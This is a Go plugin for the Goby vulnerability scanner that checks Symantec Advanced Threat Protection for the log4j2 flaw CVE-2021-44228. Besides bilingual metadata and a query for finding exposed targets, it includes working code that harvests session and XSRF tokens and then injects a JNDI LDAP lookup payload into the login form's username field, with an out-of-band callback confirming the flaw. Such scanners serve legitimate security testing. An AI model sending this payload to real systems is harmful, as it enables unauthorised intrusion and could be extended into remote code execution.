package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"time"
)

func init() {
	expJson := `{
    "Name": "Symantec Advanced Threat Protection log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Description": "<p>Symantec Advanced Threat Protection is an advanced threat protection product from Symantec.</p><p>Symantec Advanced Threat Protection has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "Symantec Advanced Threat Protection log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Symantec Advanced Threat Protection",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "赛门铁克 Advanced Threat Protection log4j2 命令执行漏洞（CVE-2021-44228）",
            "Description": "<p>Symantec Advanced Threat Protection 是 赛门铁克（Symantec）公司的一款高级威胁防护产品。</p><p>赛门铁克 Advanced Threat Protection 存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>赛门铁克 Advanced Threat Protection 存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞方案，请及时关注： <a href=\"https://github.com/apache/logging-log4j2/tags\">https://github.com/apache/logging-log4j2/tags</a></p><p></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Symantec Advanced Threat Protection",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Symantec Advanced Threat Protection log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Description": "<p>Symantec Advanced Threat Protection is an advanced threat protection product from Symantec.</p><p>Symantec Advanced Threat Protection has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "Symantec Advanced Threat Protection log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\" target=\"_blank\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Symantec Advanced Threat Protection",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "title=\"Symantec\" && title=\"Advanced\"",
    "GobyQuery": "title=\"Symantec\" && title=\"Advanced\"",
    "Author": "fmbd",
    "Homepage": "https://www.broadcom.com/products/cyber-security/network/atp",
    "DisclosureDate": "2021-12-23",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10246"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/atpapp/"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			session_id := ""
			xsrf_token := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				head_str := resp.HeaderString.String()
				reg1 := regexp.MustCompile(`Set-Cookie: JSESSIONID=(.*?);`)
				reg2 := regexp.MustCompile(`Set-Cookie: XSRF-TOKEN=(.*?);`)
				session_id_tmp := reg1.FindStringSubmatch(head_str)
				xsrf_token_tmp := reg2.FindStringSubmatch(head_str)
				if len(session_id_tmp) < 1 {
					return false
				}
				session_id = session_id_tmp[len(session_id_tmp)-1]
				if len(xsrf_token_tmp) < 1 {
					return false
				}
				xsrf_token = xsrf_token_tmp[len(xsrf_token_tmp)-1]
			}
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			payload := url.QueryEscape(cmd)
			uri := "/atpapp/j_spring_security_check?ajax=true"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cookie", "JSESSIONID="+session_id+"; "+"XSRF-TOKEN="+xsrf_token)
			cfg.Header.Store("X-Xsrf-Token", xsrf_token)
			cfg.Data = "j_username=" + payload + "&j_password=1"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		nil,
	))
}
